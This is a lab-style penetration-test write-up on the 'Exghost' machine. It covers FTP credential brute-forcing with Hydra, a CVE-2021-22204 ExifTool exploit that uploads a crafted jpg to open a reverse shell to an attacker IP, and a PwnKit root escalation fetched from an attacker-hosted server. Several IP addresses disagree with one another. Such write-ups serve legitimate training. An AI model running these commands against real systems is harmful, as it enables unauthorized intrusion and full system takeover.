# Report - Exghost

Author: Henry Post
Target: Exghost
Target IP: 192.168.53.183
Attacker IP: 192.168.49.53
Date: 03/12/2026
## Executive Summary

This machine, Exghost, was enumerated by `nmap` to have ports `21` (ftp) and `80` (http) open.

The FTP password was brute-forced and found to be `user:system`. 

On the FTP drive, a WireShark packet capture file showed that a PHP website was hosting `ExifTool` version `12.23`, which was vulnerable to `CVE-2021-22204`. This vulnerability gave us local user access.

From non-root access, we discovered that `/usr/lib/policykit-1/` existed, and realizing that the `/usr/lib/policykit-1/polkit-agent-helper-1` file was last updated on May 26, 2021, this meant that polkit is vulnerable to `CVE-2021-4034` aka "PwnKit", which is a privilege escalation vulnerability.

`CVE-2021-4034` "PwnKit" was used to pivot to root access.
## Recommendations

Update polkit to the latest non-vulnerable version.

Update exiftool to the latest non-vulnerable version.

Use strong FTP credentials and enforce timeouts for invalid attempts, or use fail2ban to ban IPs that fail multiple login attempts.
## Recon

We see that port 21 and port 80 are open.

    nmap -sS -sV 192.168.53.183

![](nmap-scan.png)

## FTP Access

Let's start with a brute force attack.

    hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.53.183:21

![](hydra-ftp-brute.png)

We successfully get the credential `user:system`.

### PCAP

When we FTP, we find a file that has a WireShark packet capture.

    ftp ftp://user:system@192.168.53.183
    passive
    ls
    get backup
    bye
    xdg-open backup

![](wireshark-pcap.png)

We see there's a path `/exiftest.php` that you can POST images to.

![](exiftest-php-path.png)

We also notice that `exiftool` version `12.23` is used.

![](exiftool-version.png)

Searching exploit-db.com for exiftool version 12.23, we find an exploit.

![](exploit-db-search.png)

We download the exploit and get ready to generate a payload `.jpg` file for the `/exiftest.php` endpoint.

We also need to install `djvulibre-bin` as we need `bzz` on the path.

    sudo apt install -y djvulibre-bin
    export ATTACKER_IP=192.168.49.55
    export ATTACKER_PORT=4444
    python3 50911.py -s $ATTACKER_IP $ATTACKER_PORT
    file image.jpg

![](payload-jpg.png)

We start a reverse shell listener on the attacker.

    nc -nvlp 4444

![](nc-listener.png)

We upload the payload to the victim using `curl`.

    export VICTIM_IP=192.168.55.183
    curl -F myFile=@image.jpg http://$VICTIM_IP:80/exiftest.php


![](curl-upload.png)

And we have local user access via RCE + reverse shell.

![](reverse-shell.png)

We stabilize the shell, since we have python3.

	which python3
	python3 -c 'import pty; pty.spawn("/bin/bash")'

![](shell-stabilize.png)

## Pivot to root

We decide to look at `/usr/lib/policykit-1/`.

	ls -lash /usr/lib/policykit-1/

![](polkit-check.png)


It looks like polkitd is quite old. CVE-2021-4034 (PwnKit) is a local privilege escalation vulnerability that affects this version of polkitd.

Searching through GitHub, I find a Python version of the exploit.

I download it on the attacker's machine and use `python3 -m http.server 8888` to transfer it.

	wget https://raw.githubusercontent.com/joeammond/CVE-2021-4034/refs/heads/main/CVE-2021-4034.py
	python3 -m http.server 8888

![](pwnkit-download.png)

Then, on the target machine, I download and run it.

	cd /dev/shm/
	wget 192.168.49.55:8888/CVE-2021-4034.py
	python3 CVE-2021-4034.py

![](root-flag.png)

And we have the root flag.